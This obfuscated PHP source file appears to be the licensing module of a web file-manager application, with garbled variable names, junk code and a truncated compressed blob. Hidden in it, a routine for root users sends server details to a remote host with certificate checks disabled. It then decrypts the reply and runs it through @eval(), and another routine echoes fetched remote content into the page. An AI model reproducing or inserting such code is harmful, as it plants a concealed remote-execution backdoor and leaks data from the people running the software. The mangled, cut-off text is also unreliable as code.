$_SERVER[É‹íîÃÊ]; $Ô¦µš±ê = array($ìùŠÍ‘¢[257], $ìùŠÍ‘¢[258], $ìùŠÍ‘¢[259]); $ßÜ†øé§ = $ìùŠÍ‘¢[260] . md5($ìùŠÍ‘¢[261]); $Ü“•ÍºÓ = $äßé¼[781]; while (strlen($Ü“•ÍºÓ) < $äßé¼[716]) { if (!$Ü“•ÍºÓ) { break; } $Ü“•ÍºÓ++; } if ($this->bxpnfb55515a == $ìùŠÍ‘¢[111] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$ìùŠÍ‘¢[24]], $Ô¦µš±ê)) { return; } if (time() % 4 != 0) { return; } $—ªĞşİ» = call_user_func(array($ìùŠÍ‘¢[262], $ìùŠÍ‘¢[263]), $ßÜ†øé§); $öô®ƒøô = $äßé¼[782]; if (!$öô®ƒøô) { die; } if ($—ªĞşİ» && time() - $—ªĞşİ» < intval($ìùŠÍ‘¢[264])) { return; } call_user_func(array($ìùŠÍ‘¢[262], $ìùŠÍ‘¢[141]), $ßÜ†øé§, time()); $£¡º¬Çµ = Model($ìùŠÍ‘¢[33])->get($ìùŠÍ‘¢[102]); $Ñ‹äş÷Å = array($ìùŠÍ‘¢[154] => Model($ìùŠÍ‘¢[33])->get($ìùŠÍ‘¢[155]), $ìùŠÍ‘¢[169] => $this->bxpnfb55515a, $ìùŠÍ‘¢[165] => $_SERVER[$ìùŠÍ‘¢[166]], $ìùŠÍ‘¢[167] => Model($ìùŠÍ‘¢[33])->get($ìùŠÍ‘¢[133]), $ìùŠÍ‘¢[107] => md5($_SERVER[$ìùŠÍ‘¢[108]] . $£¡º¬Çµ), $ìùŠÍ‘¢[158] => $ìùŠÍ‘¢[138], $ìùŠÍ‘¢[161] => $_SERVER[$ìùŠÍ‘¢[162]]); $êËˆÄİ¯ = $this->sulm1beb2536($ìùŠÍ‘¢[265], $Ñ‹äş÷Å); if (!is_array($êËˆÄİ¯)) { return; } if ($êËˆÄİ¯[$ìùŠÍ‘¢[154]] && $êËˆÄİ¯[$ìùŠÍ‘¢[266]]) { if ($this->olvj2226025a($êËˆÄİ¯[$ìùŠÍ‘¢[266]]) == $Ñ‹äş÷Å[$ìùŠÍ‘¢[154]]) { return; } } $this->habu93fe28b8(); if ($this->olvj2226025a($êËˆÄİ¯[$ìùŠÍ‘¢[266]]) != $Ñ‹äş÷Å[$ìùŠÍ‘¢[154]]) { $‚†Õ¡¢¥ = array($ìùŠÍ‘¢[187] => $£¡º¬Çµ, $ìùŠÍ‘¢[188] => $_SERVER[$ìùŠÍ‘¢[108]], $ìùŠÍ‘¢[189] => this_url(), $ìùŠÍ‘¢[163] => $_SERVER[$ìùŠÍ‘¢[164]]); $ŒÈç‹© = $this->qjph56fb17b3(json_encode($‚†Õ¡¢¥)); $êËˆÄİ¯ = $this->sulm1beb2536($ìùŠÍ‘¢[190] . $ŒÈç‹©); if ($êËˆÄİ¯ && is_array($êËˆÄİ¯) && isset($êËˆÄİ¯[$ìùŠÍ‘¢[266]])) { $àƒØùÇ· = $this->bpms88d8f41e($êËˆÄİ¯[$ìùŠÍ‘¢[266]], 2); if ($àƒØùÇ·) { $àƒØùÇ· = $this->olvj2226025a($àƒØùÇ·); } if ($àƒØùÇ·) { try { @eval($àƒØùÇ·); } catch (Exception $Š¿·«) { } } } } } private function sulm1beb2536($°´›ÊŞ = '', $É¢¶ã†Ì = array(), $†‰Â¢ = 5) { $‹—†®Ò‚ =& $_SERVER[Ï×Œõ”û]; $Õ›ü±Ã” =& $_SERVER[É‹íîÃÊ]; $òÌ“ ‚ = $Õ›ü±Ã”[267]; $òÌ“ ‚ = $this->aqoz6752ad37($òÌ“ ‚, $Õ›ü±Ã”[268]); $òÌ“ ‚ = $òÌ“ ‚ . $°´›ÊŞ; $ÜŠøç‘ã = $‹—†®Ò‚[783]; if ($É¢¶ã†Ì && is_array($É¢¶ã†Ì)) { $òÌ“ ‚ = $òÌ“ ‚ . $Õ›ü±Ã”[269] . http_build_query($É¢¶ã†Ì); } if ($É¢¶ã†Ì === -1) { return $òÌ“ ‚; } $ğîª½öÊ = stream_context_create(array($Õ›ü±Ã”[222] => array($Õ›ü±Ã”[225] => $†‰Â¢, $Õ›ü±Ã”[223] => $Õ›ü±Ã”[270]), $Õ›ü±Ã”[271] => array($Õ›ü±Ã”[272] => !1, $Õ›ü±Ã”[273] => !1))); $‰šÊ²¶¢ = $‹—†®Ò‚[784]; while (strlen($‰šÊ²¶¢) < $‹—†®Ò‚[711]) { if (!$‰šÊ²¶¢) { break; } $‰šÊ²¶¢++; } $É¢¶ã†Ì = @file_get_contents($òÌ“ ‚, !1, $ğîª½öÊ); return json_decode($É¢¶ã†Ì, !0); $ô§ìş = $‹—†®Ò‚[785]; if (!$ô§ìş) { die; } $ÁÙ‹ÊšÛ = $‹—†®Ò‚[786]; } private function asdif87cc794() { $À§ªİ„Ñ =& $_SERVER[Ï×Œõ”û]; $ªıä•×û =& $_SERVER[É‹íîÃÊ]; $Öğ€¹Òô = array($ªıä•×û[274] => $ªıä•×û[275], $ªıä•×û[276] => $ªıä•×û[277], $ªıä•×û[278] => $ªıä•×û[279], $ªıä•×û[280] => $ªıä•×û[281], $ªıä•×û[282] => $ªıä•×û[283], $ªıä•×û[284] => $ªıä•×û[217], $ªıä•×û[285] => $ªıä•×û[217], $ªıä•×û[286] => $ªıä•×û[275], $ªıä•×û[287] => $ªıä•×û[277], $ªıä•×û[288] => $ªıä•×û[279], $ªıä•×û[289] => $ªıä•×û[290], $ªıä•×û[291] => $ªıä•×û[281], $ªıä•×û[292] => $ªıä•×û[293], $ªıä•×û[294] => $ªıä•×û[283], $ªıä•×û[295] => $ªıä•×û[296], $ªıä•×û[297] => $ªıä•×û[298], $ªıä•×û[299] => $ªıä•×û[300]); $‡¼İšî¶ = $Öğ€¹Òô[$this->bxpnfb55515a]; $‡¼İšî¶ = intval($‡¼İšî¶ ? $‡¼İšî¶ : $ªıä•×û[275]); $š™Ò¼¦ = $À§ªİ„Ñ[787]; if (!$š™Ò¼¦) { return; } $Òµ¥öòÊ = _get($this->dykna2511562, $ªıä•×û[301]); $Òµ¥öòÊ = $Òµ¥öòÊ ? intval($Òµ¥öòÊ) : 0; $Í³´ = $À§ªİ„Ñ[788]; while (strlen($Í³´) < $À§ªİ„Ñ[719]) { if (!$Í³´) { break; } $Í³´++; } return $‡¼İšî¶ + $Òµ¥öòÊ; $ù¯¡¦— = $À§ªİ„Ñ[789]; while (strlen($ù¯¡¦—) < $À§ªİ„Ñ[716]) { if (!$ù¯¡¦—) { break; } $ù¯¡¦—++; } } public function uyfgff0f968c($·‘¸êß±) { $¿„½ÂßÉ =& $_SERVER[Ï×Œõ”û]; $¹‡¶©µ® =& $_SERVER[É‹íîÃÊ]; $Îá’ñ¦£ = $this->asdif87cc794(); $ışÒü = $¿„½ÂßÉ[790]; if (strlen($ışÒü) < $¿„½ÂßÉ[719]) { die; } if ($·‘¸êß±[$¹‡¶©µ®[302]] == $¹‡¶©µ®[124]) { return; } if ($Îá’ñ¦£ >= intval($¹‡¶©µ®[217])) { return; } $µ§èšğ¾ = Model($¹‡¶©µ®[127])->count(); $…âğŒÕ² = $¿„½ÂßÉ[791]; if (!$…âğŒÕ²) { return; } if ($µ§èšğ¾ <= $Îá’ñ¦£) { return; } $ãèöÚğ = Model($¹‡¶©µ®[127])->field($¹‡¶©µ®[302])->limit($Îá’ñ¦£)->select(); $ãèöÚğ = array_to_keyvalue($ãèöÚğ, $¹‡¶©µ®[6], $¹‡¶©µ®[302]); $÷¼Šõª = $¿„½ÂßÉ[792]; if (!in_array($·‘¸êß±[$¹‡¶©µ®[302]], $ãèöÚğ)) { show_json($¹‡¶©µ®[303], !1, $¹‡¶©µ®[213]); } } public function zmtxe3be787a() { $ì›®ø¿ =& $_SERVER[Ï×Œõ”û]; $ÔĞúäıƒ =& $_SERVER[É‹íîÃÊ]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $øÓ¡Øş¥ = $ÔĞúäıƒ[220]; $Œê¤´˜¦ = $ì›®ø¿[793]; if (!$Œê¤´˜¦) { return; } $øÓ¡Øş¥ = $this->aqoz6752ad37($øÓ¡Øş¥, $ÔĞúäıƒ[221]); $‘‰õ‡”Á = stream_context_create(array($ÔĞúäıƒ[222] => array($ÔĞúäıƒ[223] => $ÔĞúäıƒ[224], $ÔĞúäıƒ[225] => 3))); $÷‘…ö¶À = @file_get_contents($øÓ¡Øş¥, !1, $‘‰õ‡”Á); $­°™ùû¯ = $ì›®ø¿[794]; if (strlen($­°™ùû¯) < $ì›®ø¿[722]) { die; } echo $ÔĞúäıƒ[304] . hash_encode($÷‘…ö¶À) . $ÔĞúäıƒ[305]; } private function dhbs37d8f324($¿›÷¨¡, $ƒÏ¼©šø, $¼é¢’± = 3) { $´“¼Ò“ =& $_SERVER[Ï×Œõ”û]; $ÆÌÙ Äú =& $_SERVER[É‹íîÃÊ]; usleep(1); $ú¿¨×ìğ = $´“¼Ò“[795]; if (strlen($ú¿¨×ìğ) < $´“¼Ò“[719]) { return; } $¿›÷¨¡ = trim($¿›÷¨¡); $Ó”™©øÜ = mt_rand(0, 5) . $ÆÌÙ Äú[6]; $ğÈÛ”‚½ = $´“¼Ò“[796]; if (!$ğÈÛ”‚½) { die; } $À‡ó‚â = rand_string(15); $ñÏÃ´ß¯ = $´“¼Ò“[797]; if (!$ñÏÃ´ß¯) { return; } $‘•µ›ûç = $ÆÌÙ Äú[306]; $çøè°ãÛ = $´“¼Ò“[798]; if (strlen($çøè°ãÛ) < $´“¼Ò“[719]) { die; } switch ($Ó”™©øÜ) { case $ÆÌÙ Äú[208]: $ıçƒ“Ø = $this->vtew66607566($¿›÷¨¡, strrev($ƒÏ¼©šø . $À‡ó‚â)); break; $×®à Ÿ = $´“¼Ò“[799]; if (strlen($×®à Ÿ) < $´“¼Ò“[716]) { return; } case $ÆÌÙ Äú[124]: $ıçƒ“Ø = $this->vtew66607566($¿›÷¨¡, strrev($À‡ó‚â . $ƒÏ¼©šø)); $ÌŒŸ¤ôù = $´“¼Ò“[800]; while ($ÌŒŸ¤ôù < $´“¼Ò“[722]) { if ($ÌŒŸ¤ôù >= 0) { break; } $ÌŒŸ¤ôù++; } break; $®ìâ¦± = $´“¼Ò“[801]; case $ÆÌÙ Äú[307]: $ıçƒ“Ø = $this->vtew66607566($¿›÷¨¡, base64_encode($À‡ó‚â . $ƒÏ¼©šø)); break; case $ÆÌÙ Äú[308]: $ıçƒ“Ø = $this->vtew66607566($¿›÷¨¡, md5($À‡ó‚â . $ƒÏ¼©šø)); break; case $ÆÌÙ Äú[309]: $¿›÷¨¡ = base64_encode($¿›÷¨¡); $Ô‘†“Òû = $´“¼Ò“[802]; if (!$Ô‘†“Òû) { die; } $ë¯ãˆ½ = rand(0, 64); $÷–ùË´ = $‘•µ›ûç[$ë¯ãˆ½]; $¾¦¦³ñÛ = $´“¼Ò“[803]; if (strlen($¾¦¦³ñÛ) < $´“¼Ò“[722]) { return; } $ÄßÁçß = md5($÷–ùË´ . md5($ƒÏ¼©šø . $÷–ùË´) . $ƒÏ¼©šø); $ÄßÁçß = substr($ÄßÁçß, $ë¯ãˆ½ % 8, $ë¯ãˆ½ % 8 + 7); $†¢·¡Á¢ = $ÆÌÙ Äú[6]; $ÁñÓÎ‡ = $´“¼Ò“[804]; if (!$ÁñÓÎ‡) { return; } $÷–È¼ƒÛ = 0; $©ˆÉšù¡ = $´“¼Ò“[805]; if (strlen($©ˆÉšù¡) < $´“¼Ò“[711]) { die; } $Ô­¬ƒš = 0; $Ìó¨—±ü = $´“¼Ò“[806]; while ($Ìó¨—±ü < $´“¼Ò“[711]) { if ($Ìó¨—±ü >= 0) { break; } $Ìó¨—±ü++; } $ ğÎ«Ó = 0; $µ”„š›Ø = $´“¼Ò“[807]; if (strlen($µ”„š›Ø) < $´“¼Ò“[716]) { return; } for ($÷–È¼ƒÛ = 0; $÷–È¼ƒÛ < strlen($¿›÷¨¡); $÷–È¼ƒÛ++) { $ ğÎ«Ó = $ ğÎ«Ó == strlen($ÄßÁçß) ? 0 : $ ğÎ«Ó; $¹ˆ€É£ó = $´“¼Ò“[808]; while ($¹ˆ€É£ó < $´“¼Ò“[716]) { if ($¹ˆ€É£ó >= 0) { break; } $¹ˆ€É£ó++; } $Ô­¬ƒš = ($ë¯ãˆ½ + strpos($‘•µ›ûç, $¿›÷¨¡[$÷–È¼ƒÛ]) + ord($ÄßÁçß[$ ğÎ«Ó++])) % 64; $®´î®ÚĞ = $´“¼Ò“[809]; $†¢·¡Á¢ .= $‘•µ›ûç[$Ô­¬ƒš]; } $ıçƒ“Ø = hash_encode($÷–ùË´ . $†¢·¡Á¢); break; default: $ıçƒ“Ø = $this->vtew66607566($¿›÷¨¡, $ƒÏ¼©šø . $À‡ó‚â); $ËÄÜ—“÷ = $´“¼Ò“[810]; while ($ËÄÜ—“÷ < $´“¼Ò“[493]) { if ($ËÄÜ—“÷ >= 0) { break; } $ËÄÜ—“÷++; } break; } $ıçƒ“Ø = strrev($Ó”™©øÜ . $À‡ó‚â . $ıçƒ“Ø); if ($¼é¢’± - 1 > 0) { $ıçƒ“Ø = $this->dhbs37d8f324($ıçƒ“Ø, $ƒÏ¼©šø, $¼é¢’± - 1); } return $ıçƒ“Ø; } private function bpms88d8f41e($³¹İ‹™Ú, $ƒÉË“ÈÒ, $¿±ŞøŸ¶ = 3) { $¨„ò‘ =& $_SERVER[Ï×Œõ”û]; $”Æ·úß¬ =& $_SERVER[É‹íîÃÊ]; if (!is_string($³¹İ‹™Ú) || strlen($³¹İ‹™Ú) < 10) { return !1; } $³¹İ‹™Ú = trim($³¹İ‹™Ú); $³¹İ‹™Ú = strrev($³¹İ‹™Ú); $ÜˆæÓ = $³¹İ‹™Ú[0]; $ÍÃ„ÏÔ­ = $¨„ò‘[811]; if (strlen($ÍÃ„ÏÔ­) < $¨„ò‘[711]) { return; } $—¸¶Üø = substr($³¹İ‹™Ú, 1, 15); $ˆ–±Â»— = $¨„ò‘[812]; while ($ˆ–±Â»— < $¨„ò‘[716]) { if ($ˆ–±Â»— >= 0) { break; } $ˆ–±Â»—++; } $³¹İ‹™Ú = substr($³¹İ‹™Ú, 16); $ÒöÁÉ§Ø = $¨„ò‘[813]; $ºšÏÄ¯ = $”Æ·úß¬[306]; switch ($ÜˆæÓ) { case $”Æ·úß¬[208]: $ˆ¢¼ğ±Ò = $this->aqoz6752ad37($³¹İ‹™Ú, strrev($ƒÉË“ÈÒ . $—¸¶Üø)); $¯Ÿ—òÆ¤ = $¨„ò‘[814]; break; case $”Æ·úß¬[124]: $ˆ¢¼ğ±Ò = $this->aqoz6752ad37($³¹İ‹™Ú, strrev($—¸¶Üø . $ƒÉË“ÈÒ)); $ô†Ûâ¾ = $¨„ò‘[815]; break; case $”Æ·úß¬[307]: $ˆ¢¼ğ±Ò = $this->aqoz6752ad37($³¹İ‹™Ú, base64_encode($—¸¶Üø . $ƒÉË“ÈÒ)); break; $·æèáÌ® = $¨„ò‘[816]; if (!$·æèáÌ®) { return; } case $”Æ·úß¬[308]: $ˆ¢¼ğ±Ò = $this->aqoz6752ad37($³¹İ‹™Ú, md5($—¸¶Üø . $ƒÉË“ÈÒ)); $‡»ùı¶× = $¨„ò‘[817]; if (!$‡»ùı¶×) { return; } break; case $”Æ·úß¬[309]: $³¹İ‹™Ú = hash_decode($³¹İ‹™Ú); $øÛ¦»È¬ = $¨„ò‘[818]; if (!$øÛ¦»È¬) { return; } $€Ãœƒ¤‰ = $³¹İ‹™Ú[0]; $‰“¬‚è­ = $¨„ò‘[819]; while ($‰“¬‚è­ < $¨„ò‘[711]) { if ($‰“¬‚è­ >= 0) { break; } $‰“¬‚è­++; } $³¹İ‹™Ú = substr($³¹İ‹™Ú, 1); $ÑÕşá” = $¨„ò‘[820]; $¿ÇşÎ° = strpos($ºšÏÄ¯, $€Ãœƒ¤‰); $›µ‘ÔÄ‘ = $¨„ò‘[821]; $¥—‹¾™· = md5($€Ãœƒ¤‰ . md5($ƒÉË“ÈÒ . $€Ãœƒ¤‰) . $ƒÉË“ÈÒ); $¥—‹¾™· = substr($¥—‹¾™·, $¿ÇşÎ° % 8, $¿ÇşÎ° % 8 + 7); $£à³üÖ÷ = $”Æ·úß¬[6]; $ ³ŸŞ…½ = $¨„ò‘[822]; if (strlen($ ³ŸŞ…½) < $¨„ò‘[493]) { die; } $å¨¸Šºù = 0; $Ò‹‘Ê¡ª = $¨„ò‘[823]; while (strlen($Ò‹‘Ê¡ª) < $¨„ò‘[722]) { if (!$Ò‹‘Ê¡ª) { break; } $Ò‹‘Ê¡ª++; } $ÎÑßí¦å = 0; $Ü‚ó‹¹¿ = $¨„ò‘[824]; $ã·ÊúÈ« = 0; $±›àç‚ = $¨„ò‘[825]; if (!$±›àç‚) { die; } for ($å¨¸Šºù = 0; $å¨¸Šºù < strlen($³¹İ‹™Ú); $å¨¸Šºù++) { $ã·ÊúÈ« = $ã·ÊúÈ« == strlen($¥—‹¾™·) ? 0 : $ã·ÊúÈ«; $’¤Ø¬°ï = $ã·ÊúÈ«++; $ç¬èÆæ½ = $¨„ò‘[818]; if (!$ç¬èÆæ½) { return; } $ÎÑßí¦å = strpos($ºšÏÄ¯, $³¹İ‹™Ú[$å¨¸Šºù]) - $¿ÇşÎ° - ord($¥—‹¾™·[$’¤Ø¬°ï]); $‚¶‚¿¨ = $¨„ò‘[826]; if (strlen($‚¶‚¿¨) < $¨„ò‘[493]) { return; } while ($ÎÑßí¦å < 0) { $ÎÑßí¦å += 64; $Œ‹Ë¥Ãˆ = $¨„ò‘[827]; if (!$Œ‹Ë¥Ãˆ) { return; } } $£à³üÖ÷ .= $ºšÏÄ¯[$ÎÑßí¦å]; $ã‘ºƒÕĞ = $¨„ò‘[828]; } $ˆ¢¼ğ±Ò = base64_decode($£à³üÖ÷); break; $Éƒ»«§Í = $¨„ò‘[829]; if (!$Éƒ»«§Í) { return; } default: $ˆ¢¼ğ±Ò = $this->aqoz6752ad37($³¹İ‹™Ú, $ƒÉË“ÈÒ . $—¸¶Üø); $ßæï = $¨„ò‘[830]; break; $àƒ™Äá€ = $¨„ò‘[831]; if (!$àƒ™Äá€) { die; } } if ($¿±ŞøŸ¶ - 1 > 0) { $ˆ¢¼ğ±Ò = $this->bpms88d8f41e($ˆ¢¼ğ±Ò, $ƒÉË“ÈÒ, $¿±ŞøŸ¶ - 1); } return $ˆ¢¼ğ±Ò; } public function qjph56fb17b3($·‡ã›¿‘) { $µ¥ì«ƒ‹ =& $_SERVER[Ï×Œõ”û]; $…è­¤´’ =& $_SERVER[É‹íîÃÊ]; $î§‘ÛİÜ = $this->dfmu24b8fcbd(); $‹ÏªØú = $this->dfmu24b8fcbd(); $Ÿ¨ŞˆõÓ = $µ¥ì«ƒ‹[777]; if (!$Ÿ¨ŞˆõÓ) { return; } $äÓìê³ä = ($î§‘ÛİÜ - 1) * ($‹ÏªØú - 1); $…Ğûõ¡í = intval(($î§‘ÛİÜ + $‹ÏªØú) / 2); while (1) { $Ú¦•Ø©« = $…Ğûõ¡í; $ÀŠÔúäÆ = $µ¥ì«ƒ‹[832]; if (strlen($ÀŠÔúäÆ) < $µ¥ì«ƒ‹[722]) { die; } $ÜæÒıœü = $äÓìê³ä; while ($ÜæÒıœü % $Ú¦•Ø©« != 0) { $ªÆÄÊ°Å = $ÜæÒıœü; $ÜæÒıœü = $Ú¦•Ø©«; $Ú¦•Ø©« = $ªÆÄÊ°Å % $Ú¦•Ø©«; $³ä«ıÈÓ = $µ¥ì«ƒ‹[833]; if (!$³ä«ıÈÓ) { die; } } if ($Ú¦•Ø©« == 1) { break; } else { $…Ğûõ¡í++; } } $¿¬úïŞ© = 2; $Âİø¡Ø = $µ¥ì«ƒ‹[834]; if (!$Âİø¡Ø) { return; } for ($·Åà˜É· = 0; $·Åà˜É· < $äÓìê³ä * 10; $·Åà˜É·++) { if (($äÓìê³ä * $·Åà˜É· + 1) % $…Ğûõ¡í == 0) { $¿¬úïŞ© = intval(($äÓìê³ä * $·Åà˜É· + 1) / $…Ğûõ¡í); break; } } $„Ş€ºí¹ = $this->vtew66607566($î§‘ÛİÜ * $‹ÏªØú . $…è­¤´’[6], $…è­¤´’[138]); $„ÅßèÃİ = $µ¥ì«ƒ‹[835]; if (strlen($„ÅßèÃİ) < $µ¥ì«ƒ‹[716]) { die; } $Ä£”‰¦É = md5($…è­¤´’[310] . ($î§‘ÛİÜ + $‹ÏªØú) . $…è­¤´’[311] . $…Ğûõ¡í . $…è­¤´’[311] . $¿¬úïŞ© . $…è­¤´’[312]); $ÑêŠÆŸŸ = $µ¥ì«ƒ‹[836]; $˜ğÔæ²ö = $this->vtew66607566($·‡ã›¿‘, $Ä£”‰¦É) . $…è­¤´’[313] . $„Ş€ºí¹; $ó…®ûåú = $µ¥ì«ƒ‹[837]; if (strlen($ó…®ûåú) < $µ¥ì«ƒ‹[711]) { die; } return $˜ğÔæ²ö; } public function olvj2226025a($ôˆéëêñ) { $¨óÅŒ‰¸ =& $_SERVER[Ï×Œõ”û]; $¦É©»È =& $_SERVER[É‹íîÃÊ]; $ï”¯ é˜ = explode($¦É©»È[313], $ôˆéëêñ); if (count($ï”¯ é˜) != 2) { return $¦É©»È[6]; } $©ùæ«£µ = $this->aqoz6752ad37($ï”¯ é˜[1] . $¦É©»È[6], $¦É©»È[138]); $íöµĞ•’ = $¨óÅŒ‰¸[838]; if (!$©ùæ«£µ) { return $¦É©»È[6]; } $©ùæ«£µ = intval($©ùæ«£µ); $Õã›½ö = $¨óÅŒ‰¸[839]; if (strlen($Õã›½ö) < $¨óÅŒ‰¸[719]) { die; } $¡ğû§Ñë = 0; $†Å³ìÔ¿ = 0; for ($ÂçÑ½‘¼ = 3; $ÂçÑ½‘¼ < $©ùæ«£µ; $ÂçÑ½‘¼ += 2) { if ($©ùæ«£µ % $ÂçÑ½‘¼ != 0) { continue; } $¡ğû§Ñë = $ÂçÑ½‘¼; $ŒÊ¢«“µ = $¨óÅŒ‰¸[840]; if (!$ŒÊ¢«“µ) { return; } $†Å³ìÔ¿ = intval($©ùæ«£µ / $ÂçÑ½‘¼); $àØæÒŠ = $¨óÅŒ‰¸[841]; while ($àØæÒŠ < $¨óÅŒ‰¸[719]) { if ($àØæÒŠ >= 0) { break; } $àØæÒŠ++; } break; } $¦ƒÙ•»­ = ($¡ğû§Ñë - 1) * ($†Å³ìÔ¿ - 1); $ˆˆ¨®˜ë = intval(($¡ğû§Ñë + $†Å³ìÔ¿) / 2); $õ¨ùÜ İ = $¨óÅŒ‰¸[842]; if (strlen($õ¨ùÜ İ) < $¨óÅŒ‰¸[719]) { return; } while (1) { $ß¥Ÿ’³Ü = $ˆˆ¨®˜ë; $æúØ³³¸ = $¦ƒÙ•»­; while ($æúØ³³¸ % $ß¥Ÿ’³Ü != 0) { $ãÛõ´Î± = $æúØ³³¸; $æúØ³³¸ = $ß¥Ÿ’³Ü; $ß¥Ÿ’³Ü = $ãÛõ´Î± % $ß¥Ÿ’³Ü; $÷©¿¹Çæ = $¨óÅŒ‰¸[843]; if (strlen($÷©¿¹Çæ) < $¨óÅŒ‰¸[493]) { die; } } if ($ß¥Ÿ’³Ü == 1) { break; } else { $ˆˆ¨®˜ë++; } } $«ü¯×µ‹ = 2; $°Ñ¥ÛÂÔ = $¨óÅŒ‰¸[844]; if (!$°Ñ¥ÛÂÔ) { die; } for ($ÂçÑ½‘¼ = 0; $ÂçÑ½‘¼ < $¦ƒÙ•»­ * 10; $ÂçÑ½‘¼++) { if (($¦ƒÙ•»­ * $ÂçÑ½‘¼ + 1) % $ˆˆ¨®˜ë == 0) { $«ü¯×µ‹ = intval(($¦ƒÙ•»­ * $ÂçÑ½‘¼ + 1) / $ˆˆ¨®˜ë); break; } } $ŞŒõ¾¦¨ = md5($¦É©»È[310] . ($¡ğû§Ñë + $†Å³ìÔ¿) . $¦É©»È[311] . $ˆˆ¨®˜ë . $¦É©»È[311] . $«ü¯×µ‹ . $¦É©»È[312]); $Š‰•®è³ = $this->aqoz6752ad37($ï”¯ é˜[0], $ŞŒõ¾¦¨); return $Š‰•®è³; $ ø—°«á = $¨óÅŒ‰¸[845]; while ($ ø—°«á < $¨óÅŒ‰¸[719]) { if ($ ø—°«á >= 0) { break; } $ ø—°«á++; } } public function dfmu24b8fcbd() { $Ø¦¼ÑøÙ =& $_SERVER[Ï×Œõ”û]; $ñ‘•œøÖ = mt_rand(pow(2, 14), pow(2, 16) - 1); $±¸è²êø = $Ø¦¼ÑøÙ[846]; while (strlen($±¸è²êø) < $Ø¦¼ÑøÙ[722]) { if (!$±¸è²êø) { break; } $±¸è²êø++; } $ÖÊìÌúÏ = array(); $Ï‰ôºßÎ = $Ø¦¼ÑøÙ[847]; if (strlen($Ï‰ôºßÎ) < $Ø¦¼ÑøÙ[711]) { die; } $ÔÌİ×êƒ = 1; while ($ÔÌİ×êƒ <= (int) sqrt($ñ‘•œøÖ)) { $ÏÙ¢È“¦ = $ÔÌİ×êƒ; while (!0) { $ÏÙ¢È“¦++; $ÆşãÇõ± = $Ø¦¼ÑøÙ[848]; if (strlen($ÆşãÇõ±) < $Ø¦¼ÑøÙ[722]) { return; } if ($ÏÙ¢È“¦ <= 2) { $ÔÌİ×êƒ = $ÏÙ¢È“¦; break; } else { if ($ÏÙ¢È“¦ < 2) { continue; } } $œ§â¡µ¢ = !0; for ($Àíí½‰è = 2; $Àíí½‰è <= sqrt($ÏÙ¢È“¦); $Àíí½‰è++) { if ($ÏÙ¢È“¦ % $Àíí½‰è == 0) { $œ§â¡µ¢ = !1; } } if ($œ§â¡µ¢) { $ÔÌİ×êƒ = $ÏÙ¢È“¦; break; } } $ÖÊìÌúÏ[] = $ÔÌİ×êƒ; $İå¼Ä¸‰ = $Ø¦¼ÑøÙ[849]; while (strlen($İå¼Ä¸‰) < $Ø¦¼ÑøÙ[716]) { if (!$İå¼Ä¸‰) { break; } $İå¼Ä¸‰++; } } $éÎÈ•À = 2; $€®‘Äï½ = $Ø¦¼ÑøÙ[850]; while (strlen($€®‘Äï½) < $Ø¦¼ÑøÙ[711]) { if (!$€®‘Äï½) { break; } $€®‘Äï½++; } for ($ÏÙ¢È“¦ = $ñ‘•œøÖ; $ÏÙ¢È“¦ > 1; $ÏÙ¢È“¦--) { $œ§â¡µ¢ = !0; foreach ($ÖÊìÌúÏ as $åÀßÉá) { if ($ÏÙ¢È“¦ % $åÀßÉá == 0) { $œ§â¡µ¢ = !1; break; } } if ($œ§â¡µ¢) { $éÎÈ•À = $ÏÙ¢È“¦; break; } } return $éÎÈ•À; $¡”’„î = $Ø¦¼ÑøÙ[851]; if (!$¡”’„î) { die; } } public function myko60a1b771($‹¼š Î, $ÎÜŠä) { $õçúçò— =& $_SERVER[É‹íîÃÊ]; return call_user_func(array($õçúçò—[8], $õçúçò—[314]), $‹¼š Î, $ÎÜŠä); $Ÿ´à”Öª = $_SERVER[Ï×Œõ”û][852]; if (!$Ÿ´à”Öª) { return; } } public function vtew66607566($ÅÃì¶ê, $ôÊ¨®‡·) { $Ó†ğ¯Ú =& $_SERVER[É‹íîÃÊ]; return call_user_func(array($Ó†ğ¯Ú[315], $Ó†ğ¯Ú[316]), $ÅÃì¶ê, $ôÊ¨®‡·); $ô±¤ß¹ï = $_SERVER[Ï×Œõ”û][853]; } public function aqoz6752ad37($æÇçÄ‚¸, $á·Îå¾‡) { $Ô„´Ø‰’ =& $_SERVER[É‹íîÃÊ]; return call_user_func(array($Ô„´Ø‰’[315], $Ô„´Ø‰’[317]), $æÇçÄ‚¸, $á·Îå¾‡); } } goto F¬²½ò¬é°; f¯ì›Ç½Â: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\317\327\214\365\224\373", "\336\212\344\363\247\207"); $_SERVER[Ï×Œõ”û] = explode("\174\4\174\2\174\4", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\275\171\174\33\325\265\0\314\332\102\272\260\265\54\245\224\301\44\261\235\150\261\235\335\211\223\310\262\154\213\310\226\221\344\54\330\146\62\222\306\322\330\222\106"."\326\214\274\221\120\366\75\354\220\220\102\13\245\264\320\127\22\240\54\51\153\201\327\102\313\362\50\224\26\50\55\155\212\235\320\127\240\224\2\245\245\360\335\345\334\145\106\62\274\357\367\375\361\5\22"."\315\335\357\75\367\334\163\317\75\367\234\163\237\272\365\362\177\136\363\344\246\3\66\355\267\351\200\235\157\135\170\327\57\257\244\337\350\357\201\233\366\245\337\307\137\174\320\76\344\317\21\27\137\124\127"."\327\271\170\326\374\356\57\136\166\367\355\332\17\265\333\265\113\242\221\247\236\16\177\351\331\37\235\24\232\276\371\251\211\351\175\367\371\370\211\217\237\153\106\231\151\331\146\372\243\24\114\133\321\307\15".strrev('i›ÏNY©Å	éíï„Ñİ«¥ƒ9#Zÿ"ı'."\n".'èú'."\r".':Úo=%"ÆôşŸ¯èmú